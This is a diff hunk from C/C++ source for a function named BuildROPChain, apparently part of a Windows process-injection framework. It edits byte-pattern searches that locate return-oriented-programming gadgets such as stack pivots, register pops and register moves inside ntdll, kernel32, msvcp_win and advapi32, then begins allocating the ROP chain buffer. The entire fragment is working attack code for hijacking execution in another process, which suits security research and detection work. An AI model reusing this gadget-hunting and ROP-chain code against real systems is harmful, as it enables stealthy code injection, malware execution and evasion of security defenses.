@@ -368,25 +368,25 @@ PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map
 
 	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\xc3", 1);
 	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5C\xC3", 2); // pop rsp; ret
-	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)kernel32_info.address) + 0x1000, kernel32_info.size, "\x50\xc3", 2); 	//0x000000018003afb4 : push rax; ret // 50c3
+	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)kernel32_info.address), kernel32_info.size, "\x50\xc3", 2); 	//0x000000018003afb4 : push rax; ret // 50c3
 	DWORD64 GADGET_RCX_pivot = (DWORD64)memmem(((BYTE*)msvcp_win_info.address), msvcp_win_info.size, "\x51\xc3", 2); // push rcx; ret //51c3
 
 	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
-	DWORD64 GADGET_popRCX = (DWORD64)memmem(((BYTE*)ntdll_info.address) + 0x1000, ntdll_info.size, "\x59\xC3", 2); // pop rcx; ret;
+	DWORD64 GADGET_popRCX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x59\xC3", 2); // pop rcx; ret;
 	DWORD64 GADGET_popRDX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5a\x41\x5b\xc3", 4); //pop rdx pop r11 ret
 	DWORD64 GADGET_popR8 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x58\xc3", 3); // pop r8 ; ret;
 	DWORD64 GADGET_POP_R9_R10_r11 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x59\x41\x5a\x41\x5b\xc3", 7); //0x000000018008fb34 : pop r9 ; pop r10 ; pop r11 ; ret // 4159415a415bc3
-	DWORD64 GADGET_popR14 = (DWORD64)memmem(((BYTE*)ntdll_info.address) + 0x1000, ntdll_info.size, "\x41\x5E\xC3", 3);
+	DWORD64 GADGET_popR14 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x41\x5E\xC3", 3);
 	
 	DWORD64 GADGET_RAXtoRCX = (DWORD64)memmem((BYTE*)advapi_info.address, advapi_info.size, "\x48\x8b\xc8\x48\x8b\xc1\x48\x83\xc4\x28\xc3", 11); //0x000000018001852a : mov rcx, rax ; mov rax, rcx ; add rsp, 0x28 ; ret // 488bc8488bc14883c428c3
 	DWORD64 GADGET_RAXtoRBX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x50\x5b\xc3", 3); //0x00000001800011a3 : push rax ; pop rbx ; ret // 505bc3
 	DWORD64 GADGET_RAXtoR9 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x8B\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); //mov r9, rax; mov rax, r9; add rsp, 0x28; ret;
 	DWORD64 GADGET_RBXtoRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x8b\xc3\x48\x83\xc4\x20\x5b\xc3", 9); //0x00000001800695d8 : mov rax, rbx ; add rsp, 0x20 ; pop rbx ; ret // 488bc34883c4205bc3
-	DWORD64 GADGET_AddR14toRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address) + 0x1000, ntdll_info.size, "\x4C\x01\xF0\xC3", 4);
-	DWORD64 GADGET_RCXtoR8 = (DWORD64)memmem(((BYTE*)ntdll_info.address) + 0x1000, ntdll_info.size, "\x4c\x8b\xc1\x48\x3b\xca\x77\xd7\x49\x8b\xc0\xc3\xcc\x33\xc0\xc3", 16); //mov r8, rcx; cmp rcx, rdx; ja 0x64bd9; mov rax, r8; ret;
+	DWORD64 GADGET_AddR14toRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x01\xF0\xC3", 4);
+	DWORD64 GADGET_RCXtoR8 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4c\x8b\xc1\x48\x3b\xca\x77\xd7\x49\x8b\xc0\xc3\xcc\x33\xc0\xc3", 16); //mov r8, rcx; cmp rcx, rdx; ja 0x64bd9; mov rax, r8; ret;
 
 	DWORD64 GADGET_addrsp = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
-	DWORD64 GADGET_addrsp_0x38 = (DWORD64)memmem(((BYTE*)ntdll_info.address) + 0x1000, ntdll_info.size, "\x48\x83\xC4\x38\xC3", 5); //add rsp, 0x38; ret
+	DWORD64 GADGET_addrsp_0x38 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x83\xC4\x38\xC3", 5); //add rsp, 0x38; ret
 
 	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
 
